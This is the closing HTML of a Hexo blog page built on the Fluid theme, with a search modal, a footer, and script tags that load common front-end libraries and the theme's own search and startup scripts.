      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
